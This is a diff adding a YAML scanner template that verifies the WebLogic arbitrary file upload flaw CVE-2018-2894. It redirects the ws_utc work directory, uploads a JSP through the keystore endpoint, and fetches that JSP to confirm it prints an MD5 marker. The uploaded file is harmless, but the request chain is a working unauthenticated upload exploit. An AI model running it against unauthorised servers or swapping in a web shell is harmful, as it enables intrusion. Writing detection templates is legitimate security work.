@@ -1,0 +1,108 @@
+id: poc-yaml-weblogic-anyfile-upload
+info:
+  name: Weblogic任意文件上传漏洞(CVE-2018-2894)
+  severity: critical
+  tags:
+  - CVE-2018-2894
+  - 两高一弱
+  finger: weblogic
+variables:
+  t1: random_str(4)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ws_utc/resources/setting/options
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: setting_id=general&BasicConfigOptions.workDir=%2Fu01%2Foracle%2Fuser_projects%2Fdomains%2Fbase_domain%2Fservers%2FAdminServer%2Ftmp%2F_WL_internal%2Fcom.oracle.webservices.wls.ws-testclient-app-wls%2F4mcj4y%2Fwar%2Fcss&BasicConfigOptions.proxyHost=&BasicConfigOptions.proxyPort=80
+  expression: status_code == 200
+- method: POST
+  path: /ws_utc/resources/setting/keystore
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuim0dyiDSPBPu31g
+  data: '------WebKitFormBoundaryuim0dyiDSPBPu31g
+
+    Content-Disposition: form-data; name="ks_name"
+
+
+    {{.t1}}
+
+    ------WebKitFormBoundaryuim0dyiDSPBPu31g
+
+    Content-Disposition: form-data; name="ks_edit_mode"
+
+
+    false
+
+    ------WebKitFormBoundaryuim0dyiDSPBPu31g
+
+    Content-Disposition: form-data; name="ks_password_front"
+
+
+
+    ------WebKitFormBoundaryuim0dyiDSPBPu31g
+
+    Content-Disposition: form-data; name="ks_password"
+
+
+
+    ------WebKitFormBoundaryuim0dyiDSPBPu31g
+
+    Content-Disposition: form-data; name="ks_password_changed"
+
+
+    false
+
+    ------WebKitFormBoundaryuim0dyiDSPBPu31g
+
+    Content-Disposition: form-data; name="ks_filename"; filename="{{.t1}}.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <%@ page import="java.util.*,java.io.*"%>
+
+    <%@ page import="java.security.MessageDigest"%>
+
+
+    <%
+
+    String cve = "{{.t1}}";
+
+    MessageDigest alg = MessageDigest.getInstance("MD5");
+
+    alg.reset();
+
+    alg.update(cve.getBytes());
+
+    byte[] digest = alg.digest();
+
+    StringBuffer hashedpasswd = new StringBuffer();
+
+    String hx;
+
+    for (int i=0;i<digest.length;i++){
+
+    hx =  Integer.toHexString(0xFF & digest[i]);
+
+    //0x03 is equal to 0x3, but we need 0x03 for our md5sum
+
+    if(hx.length() == 1){hx = "0" + hx;}
+
+    hashedpasswd.append(hx);
+
+    }
+
+
+    out.println(hashedpasswd.toString());
+
+    %>
+
+    ------WebKitFormBoundaryuim0dyiDSPBPu31g--'
+  expression: status_code == 200 && contains(body,"<id>")
+  output:
+  - regex_match(body,"<keyStoreItem><id>(?P<Id>[0-9]+)</id><name>"+t1+"</name>")
+- method: GET
+  path: /ws_utc/css/config/keystore/{{.Id}}_{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2)
+transport: http
